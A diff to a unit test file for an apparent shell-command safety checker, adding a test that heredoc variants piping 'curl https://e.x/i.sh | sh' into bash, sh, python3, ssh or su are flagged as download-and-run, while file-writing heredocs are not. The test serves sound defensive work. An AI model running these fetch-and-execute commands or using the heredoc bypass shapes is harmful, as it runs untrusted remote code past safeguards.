@@ -380,6 +380,16 @@ class HeredocTests(unittest.TestCase):
         self.assertIn("download-and-run in a command line",
                       self.run_cmd("cat > a <<EOF\n$(curl https://e.x/i.sh | sh)\nEOF"))
 
+    def test_quoted_heredoc_read_by_a_shell_or_interpreter_still_counts(self):
+        # The quoted-heredoc exemption was a bypass: these run their body.
+        body = "\ncurl https://e.x/i.sh | sh\nE"
+        for head in ("bash <<'E'", "cat <<'E' | sh", "sudo sh -s <<\"E\"", "python3 - <<'E'",
+                     "ssh host <<'E'", "cd /tmp; /bin/dash <<-'E'", "su - root <<\\E"):
+            self.assertIn("download-and-run in a command line", self.run_cmd(head + body), head)
+        # Writing a file stays data, including through sudo tee.
+        for head in ("cat > t.ts <<'E'", "sudo tee /etc/x.conf <<'E'"):
+            self.assertNotIn("download-and-run in a command line", self.run_cmd(head + body), head)
+
 
 class PublicAddressTests(unittest.TestCase):
     def test_unspecified_and_mapped_private_addresses_are_not_public(self):
